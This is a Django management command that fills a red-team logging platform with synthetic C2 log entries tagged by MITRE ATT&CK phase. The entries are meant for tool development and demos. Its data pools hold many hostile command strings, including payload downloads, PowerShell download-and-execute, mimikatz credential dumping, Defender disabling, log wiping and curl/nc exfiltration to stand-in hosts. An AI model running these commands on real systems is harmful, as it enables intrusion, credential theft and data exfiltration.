"""
Management command to generate realistic C2-like data for the Clio platform.

Usage:
    python manage.py seed_c2_data                  # 200 logs, default operations
    python manage.py seed_c2_data --count 500      # 500 logs
    python manage.py seed_c2_data --operation IRON-PHANTOM
    python manage.py seed_c2_data --clear           # wipe seed data first

This generates data typical of an authorized penetration test or CTF exercise.
"""
import random
from datetime import datetime, timedelta, timezone

from django.core.management.base import BaseCommand

from logs.models import Log
from operations.models import Operation, UserOperation
from tags.models import Tag, LogTag


# ---------------------------------------------------------------------------
# Realistic C2 data pools
# ---------------------------------------------------------------------------

OPERATIONS = [
    ("CRIMSON-HAWK", "Authorized internal pentest engagement - Q1 2025"),
    ("SILVER-TIDE", "CTF red team exercise - Spring event"),
    ("IRON-PHANTOM", "Purple team assessment - production network"),
]

MITRE_TAGS = [
    ("initial-access", "#ef4444", "Techniques for gaining initial access"),
    ("execution", "#f97316", "Techniques for running malicious code"),
    ("persistence", "#eab308", "Techniques for maintaining presence"),
    ("privilege-escalation", "#f59e0b", "Techniques for gaining higher-level privileges"),
    ("defense-evasion", "#84cc16", "Techniques for avoiding detection"),
    ("credential-access", "#a855f7", "Techniques for stealing credentials"),
    ("discovery", "#3b82f6", "Techniques for learning about the environment"),
    ("lateral-movement", "#6366f1", "Techniques for moving through the network"),
    ("collection", "#8b5cf6", "Techniques for gathering target data"),
    ("exfiltration", "#ec4899", "Techniques for stealing data"),
    ("command-and-control", "#14b8a6", "Techniques for communicating with implants"),
    ("impact", "#dc2626", "Techniques for disrupting availability or integrity"),
]

WINDOWS_HOSTS = [
    "WORKSTATION-01", "WORKSTATION-02", "WORKSTATION-03", "WORKSTATION-04",
    "DC01", "DC02", "FILESVR-03", "EXCHG-01", "SQLSVR-01", "SQLSVR-02",
    "WEBSVR-01", "ADFS-01", "CITRIX-01", "JUMPBOX-01", "PRINT-01",
]

LINUX_HOSTS = [
    "web-prod-1", "web-prod-2", "db-backup-1", "db-backup-2",
    "jenkins-ci", "gitlab-runner", "monitoring-1", "elk-stack-1",
    "docker-host-1", "docker-host-2", "vpn-gw-1", "mail-relay-1",
]

ANALYSTS = ["operator1", "operator2", "operator3", "admin"]

STATUS_WEIGHTS = [
    ("success", 45),
    ("failed", 20),
    ("in-progress", 15),
    ("needs-review", 20),
]

# Commands organized by MITRE phase
COMMANDS = {
    "initial-access": [
        "phishing-link delivered via email to target users",
        "gobuster dir -u https://target.local -w /usr/share/wordlists/dirb/common.txt",
        "ffuf -u https://target.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large.txt",
        "nmap -sV -sC -p- 10.0.0.0/24 -oA initial_scan",
        "responder -I eth0 -wrf",
    ],
    "execution": [
        "powershell -enc JABjAGwAaQBlAG4AdA...",
        "certutil -urlcache -split -f http://10.0.0.5/payload.exe C:\\Windows\\Temp\\svc.exe",
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "cmd.exe /c whoami && ipconfig /all",
        "wmic process call create 'powershell -ep bypass -file C:\\temp\\run.ps1'",
    ],
    "persistence": [
        "schtasks /create /tn \"WindowsUpdate\" /tr C:\\temp\\beacon.exe /sc hourly",
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v svchost /d C:\\temp\\svc.exe",
        "crontab -e  # added reverse shell to */5 * * * *",
        "systemctl enable backdoor.service",
        "New-Service -Name 'WinDefenderUpdate' -BinaryPathName 'C:\\temp\\beacon.exe'",
    ],
    "privilege-escalation": [
        "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
        "sudo -l  # found NOPASSWD entry for /usr/bin/python3",
        "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "Invoke-PrintNightmare -DriverName 'evil' -NewUser hacker -NewPassword P@ssw0rd",
        "juicypotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a '/c whoami' -t *",
    ],
    "defense-evasion": [
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "timestomp -m '2024-01-01 00:00:00' C:\\temp\\beacon.exe",
        "echo '' > /var/log/auth.log",
        "Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/shell.ps1')}",
        "iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT  # blend with HTTPS traffic",
    ],
    "credential-access": [
        "mimikatz.exe sekurlsa::logonpasswords",
        "secretsdump.py DOMAIN/admin:P@ssw0rd@10.0.0.1",
        "cat /etc/shadow | hashcat -m 1800 -a 0 -o cracked.txt",
        "Invoke-Kerberoast -OutputFormat Hashcat | fl",
        "net use \\\\DC01\\SYSVOL /user:domain\\admin  # GPP password found",
    ],
    "discovery": [
        "whoami /all",
        "net user /domain",
        "net group \"Domain Admins\" /domain",
        "ipconfig /all && arp -a",
        "nmap -sn 10.0.0.0/24",
        "cat /etc/passwd",
        "ss -tlnp",
        "id && uname -a",
        "Get-ADUser -Filter * -Properties * | Export-CSV users.csv",
        "bloodhound-python -c All -d corp.local -u user -p pass -ns 10.0.0.1",
    ],
    "lateral-movement": [
        "psexec.py DOMAIN/admin:P@ssw0rd@10.0.0.50 cmd.exe",
        "wmiexec.py DOMAIN/admin@10.0.0.50",
        "evil-winrm -i 10.0.0.50 -u admin -p P@ssw0rd",
        "ssh -i stolen_key.pem root@10.0.0.100",
        "xfreerdp /v:10.0.0.50 /u:admin /p:P@ssw0rd /cert:ignore",
        "Invoke-Command -ComputerName FILESVR-03 -ScriptBlock {whoami}",
    ],
    "collection": [
        "find /home -name '*.conf' -o -name '*.env' -o -name '*.key' 2>/dev/null",
        "Get-ChildItem -Path C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf | Copy-Item -Destination C:\\temp\\loot\\",
        "mysqldump -u root -p database > dump.sql",
        "tar czf /tmp/data.tar.gz /opt/application/data/",
        "sqlite3 /var/lib/app/db.sqlite3 '.dump' > export.sql",
    ],
    "exfiltration": [
        "curl -X POST -F 'file=@/tmp/data.tar.gz' https://exfil.server/upload",
        "scp /tmp/loot.zip operator@10.0.0.5:/home/operator/loot/",
        "base64 /tmp/data.tar.gz | nc 10.0.0.5 4444",
        "Compress-Archive -Path C:\\temp\\loot -DestinationPath C:\\temp\\out.zip",
        "rclone copy /data remote:exfil-bucket",
    ],
    "command-and-control": [
        "beacon> sleep 30 50  # adjusted beacon interval",
        "ssh -R 8080:localhost:80 operator@jumpbox  # reverse tunnel",
        "chisel server -p 8888 --reverse",
        "socat TCP-LISTEN:4444,reuseaddr,fork TCP:10.0.0.5:4444",
        "dnscat2-client c2.domain.com  # DNS tunneling active",
    ],
    "impact": [
        "ransomware_simulator.exe --test --encrypt-path C:\\Users\\test\\",
        "dd if=/dev/urandom of=/tmp/test_destructive bs=1M count=100  # demo only",
        "Stop-Service -Name 'CriticalService' -Force  # service disruption test",
    ],
}

NOTES = [
    "Initial foothold established via exposed web application",
    "Domain admin hash captured - verify scope with team lead",
    "Firewall rules bypassed using DNS tunneling",
    "Credentials found in plaintext config file",
    "Need to validate finding with blue team before proceeding",
    "Screenshot captured as evidence",
    "Pivoted through compromised workstation to reach server segment",
    "AV evasion technique successful - no alerts generated",
    "SQL injection confirmed - extracted user table",
    "Kerberoasting yielded 3 crackable service account hashes",
    "Port scan completed - 47 hosts identified",
    "VPN credentials obtained from memory dump",
    "Backup server has weak permissions - escalation path confirmed",
    "Flagged for deconfliction with IT team",
    "LLMNR poisoning captured NTLM hashes from 5 workstations",
    "GPO misconfiguration allows local admin on all workstations",
    "Jenkins server has anonymous access enabled",
    "Docker socket exposed without authentication",
    "Found AWS keys in .env file - reported to client immediately",
    "",  # some logs have no notes
    "",
    "",
]


class Command(BaseCommand):
    help = "Generate realistic C2-like seed data for the Clio platform"

    def add_arguments(self, parser):
        parser.add_argument(
            "--count", type=int, default=200,
            help="Number of log entries to generate (default: 200)",
        )
        parser.add_argument(
            "--operation", type=str, default="",
            help="Operation name to scope logs to (default: creates all)",
        )
        parser.add_argument(
            "--clear", action="store_true",
            help="Clear existing seed data before generating",
        )

    def handle(self, *args, **options):
        count = options["count"]
        target_op = options["operation"]
        clear = options["clear"]

        if clear:
            self.stdout.write("Clearing existing data...")
            LogTag.objects.all().delete()
            Log.objects.filter(analyst__in=ANALYSTS).delete()
            self.stdout.write(self.style.WARNING("Cleared existing seed logs and log-tags"))

        # Create MITRE tags
        tags = {}
        for name, color, desc in MITRE_TAGS:
            tag, created = Tag.objects.get_or_create(
                name=name,
                defaults={"color": color, "description": desc, "category": "mitre-attack"},
            )
            tags[name] = tag
            if created:
                self.stdout.write(f"  Created tag: {name}")

        # Create operations
        operations = []
        ops_to_create = [(target_op, "Custom operation")] if target_op else OPERATIONS
        for op_name, op_desc in ops_to_create:
            op_tag, _ = Tag.objects.get_or_create(
                name=f"op:{op_name.lower()}",
                defaults={"color": "#6366f1", "category": "operation"},
            )
            op, created = Operation.objects.get_or_create(
                name=op_name,
                defaults={
                    "description": op_desc,
                    "tag_id": op_tag,
                    "created_by": "admin",
                },
            )
            operations.append(op)
            if created:
                self.stdout.write(f"  Created operation: {op_name}")
                # Assign analysts
                for analyst in ANALYSTS:
                    UserOperation.objects.get_or_create(
                        username=analyst,
                        operation_id=op,
                        defaults={"assigned_by": "admin", "is_primary": analyst == "operator1"},
                    )

        # Generate log entries
        self.stdout.write(f"\nGenerating {count} log entries...")
        now = datetime.now(timezone.utc)
        statuses = [s for s, _ in STATUS_WEIGHTS]
        weights = [w for _, w in STATUS_WEIGHTS]
        tag_names = list(tags.keys())

        logs_created = 0
        for i in range(count):
            # Timestamp: spread over last 7 days with work-hour clustering
            days_ago = random.uniform(0, 7)
            hour = random.gauss(14, 4)  # peak around 2pm
            hour = max(0, min(23, int(hour)))
            ts = now - timedelta(days=days_ago)
            ts = ts.replace(hour=hour, minute=random.randint(0, 59), second=random.randint(0, 59))

            # Pick MITRE phase and matching command
            phase = random.choice(tag_names)
            command = random.choice(COMMANDS[phase])

            # Pick host type
            is_windows = random.random() < 0.65
            hostname = random.choice(WINDOWS_HOSTS if is_windows else LINUX_HOSTS)

            # Generate IPs
            internal_ip = f"10.{random.randint(0, 10)}.{random.randint(0, 254)}.{random.randint(1, 254)}"
            external_ip = f"{random.choice([203, 198, 185, 172])}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

            log = Log.objects.create(
                timestamp=ts,
                hostname=hostname,
                internal_ip=internal_ip,
                external_ip=external_ip,
                username=f"{'CORP\\\\' if is_windows else ''}{random.choice(['jsmith', 'admin', 'svc_backup', 'root', 'www-data', 'dbadmin'])}",
                command=command,
                notes=random.choice(NOTES),
                status=random.choices(statuses, weights=weights, k=1)[0],
                analyst=random.choice(ANALYSTS),
                domain="corp.local" if is_windows else "",
                pid=str(random.randint(100, 65535)) if random.random() < 0.3 else "",
            )

            # Tag with MITRE phase
            LogTag.objects.create(log=log, tag=tags[phase], tagged_by=log.analyst)

            # Sometimes add a second tag
            if random.random() < 0.3:
                second_tag = random.choice(tag_names)
                if second_tag != phase:
                    LogTag.objects.get_or_create(
                        log=log, tag=tags[second_tag],
                        defaults={"tagged_by": log.analyst},
                    )

            # Tag with operation
            op = random.choice(operations)
            if op.tag_id:
                LogTag.objects.get_or_create(
                    log=log, tag=op.tag_id,
                    defaults={"tagged_by": log.analyst},
                )

            logs_created += 1
            if (i + 1) % 50 == 0:
                self.stdout.write(f"  ... {i + 1}/{count} logs created")

        self.stdout.write(self.style.SUCCESS(
            f"\nDone! Created {logs_created} log entries across "
            f"{len(operations)} operation(s) with {len(tags)} MITRE tags."
        ))
